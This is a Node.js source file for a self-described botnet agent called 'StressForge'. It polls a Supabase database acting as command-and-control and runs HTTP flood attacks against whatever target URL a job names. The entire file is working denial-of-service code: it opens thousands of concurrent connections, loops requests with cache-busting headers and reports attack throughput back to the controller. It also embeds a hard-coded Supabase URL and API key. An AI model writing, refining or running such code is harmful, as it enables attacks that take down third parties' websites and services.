/**
 * STRESSFORGE BOTNET AGENT V3.2 (STABLE)
 * - Fixed: Immediate completion bug (Null Duration)
 * - Fixed: URL Parsing for connection stability
 * - Added: Verbose logging for Render debugging
 */
const https = require('https');
const http = require('http');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// --- RENDER KEEP-ALIVE ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent Active'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- HELPER: ROBUST REQUEST ---
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); }
                });
            });
            req.on('error', (e) => { 
                console.error('[NET-ERR] Supabase Connection Failed:', e.message); 
                reject(e); 
            });
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[36m[AGENT] Initialized V3.2. Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;

const startAttack = (job) => {
    if (activeJob) return;
    activeJob = job;
    
    // SAFETY: Handle null/zero duration
    const duration = (job.duration && job.duration > 0) ? job.duration : 30; // Default to 30s if missing
    
    console.log(`\x1b[33m[ATTACK] ${job.method || 'GET'} ${job.target} | Threads: ${job.concurrency} | Duration: ${duration}s\x1b[0m`);
    
    let running = true;
    let totalRequests = 0;
    const startTime = Date.now();
    
    let targetUrl;
    try { targetUrl = new URL(job.target); } catch(e) { console.error('Invalid Target URL'); return; }
    
    const agent = new https.Agent({ keepAlive: true, maxSockets: 5000 });
    const requestLib = targetUrl.protocol === 'https:' ? https : http;
    const reqOptions = {
        agent,
        method: job.method || 'GET',
        headers: job.headers || {},
    };
    reqOptions.headers['Host'] = targetUrl.host;
    reqOptions.headers['Cache-Control'] = 'no-cache';

    const flood = () => {
        if (!running) return;
        const req = requestLib.request(job.target, reqOptions, (res) => {
            res.resume(); 
            totalRequests++;
            flood();
        });
        req.on('error', () => { totalRequests++; flood(); });
        
        if (job.body && ['POST','PUT','PATCH'].includes(job.method)) {
             try { req.write(typeof job.body === 'string' ? job.body : JSON.stringify(job.body)); } catch(e) {}
        }
        req.end();
    };

    for(let i=0; i<job.concurrency; i++) flood();

    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed) || 0;
        
        try {
             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps });
        } catch(e) { console.error('[SYNC-ERR] Failed to report stats'); }

        // STRICT COMPLETION CHECK
        if (duration > 0 && elapsed >= duration) {
            running = false;
            clearInterval(activeLoop);
            activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED', logs: 'Finished by Agent Timeout' });
            console.log('[COMPLETE] Attack finished successfully.');
        }
    }, 2000);
};

// Poll every 3s
setInterval(async () => {
    if (activeJob) return;
    try {
        const jobs = await supabaseRequest('GET', '/jobs?status=eq.PENDING&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            console.log('Received Job:', job.id);
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { 
        // Silent catch for poll errors to prevent log spam, unless critical
    }
}, 3000);
